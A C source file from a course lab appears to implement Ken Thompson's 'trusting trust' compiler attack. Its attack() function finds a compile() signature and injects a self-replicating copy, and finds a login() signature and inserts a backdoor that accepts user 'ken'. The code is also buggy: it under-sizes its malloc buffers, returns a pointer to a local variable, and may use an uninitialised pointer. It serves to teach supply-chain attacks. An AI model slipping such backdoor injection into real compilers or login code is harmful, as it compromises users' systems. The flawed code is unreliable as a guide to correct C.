// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
/*
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define error(args...) do { fprintf(stderr, ##args); exit(1);  } while(0)
*/

// a not very interesting compile
static char** attack(char **program, char **outname) {
    // not a very robust finger-print, but what can you do.
    // in a real compiler we would do this match on the parse tree,
    // which strips out some non-essential features.
    static char compile_sig[] = 
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;
    // inject this after the assert.  not much of an attack.   this is just a quick placeholder.
    //static char compile_attack[] = "printf(\"%s:%d: could have run your attack here!!\\n\", __FUNCTION__, __LINE__);";
	static char compile_attack[sizeof prog];
	memcpy(compile_attack, prog, sizeof prog);

    static char login_sig[] = "int login(char *user) {";
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

    /* your code goes here */
	
	char* new_prog;

	// identity attack follows here
	char* compile_ptr;
	 
	if(compile_ptr = strstr(*program, compile_sig)) {
		new_prog = (char*)malloc(strlen(*program) + strlen(compile_sig));
		strncpy(new_prog, *program, compile_ptr-(*program));
		new_prog[compile_ptr-(*program)] = '\0';
		strcat(new_prog, compile_sig);
		strcat(new_prog, compile_attack);
		char* remaining_prog = compile_ptr + strlen(compile_sig);
		strcat(new_prog, remaining_prog);
	}
	
	// login attack follows here
	char* login_ptr;
	
	if((login_ptr = strstr(*program, login_sig))) {
		new_prog = (char*)malloc(strlen(*program) + strlen(login_sig));
		strncpy(new_prog, *program, login_ptr-(*program));
		new_prog[login_ptr-(*program)] = '\0';
		strcat(new_prog, login_sig);
		strcat(new_prog, login_attack);
		char* remaining_prog = login_ptr + strlen(login_sig);
		strcat(new_prog, remaining_prog);
	}

	*program = new_prog;

	return &new_prog;
}
